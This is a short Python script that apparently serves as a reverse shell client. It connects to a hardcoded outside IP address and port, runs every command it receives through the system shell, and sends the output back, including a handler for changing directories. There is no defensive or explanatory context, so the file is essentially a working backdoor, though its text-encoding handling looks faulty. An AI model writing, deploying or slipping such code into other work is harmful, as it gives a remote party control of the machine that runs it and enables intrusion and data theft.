import os
import socket
import subprocess

s=socket.socket()
host="182.183.102.228"
port=1234
s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-32")=="cd":
        os.chdir(data[3:].decode("utf-32"))
    if len(data) > 0:
        cmd=subprocess.Popen(data.decode("utf-32"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output=cmd.stdout.read()+cmd.stderr.read()
        output=str(output,"utf-32")
        string3=str.encode(output+str(os.getcwd()+'>'))
        s.send(string3)
s.close()
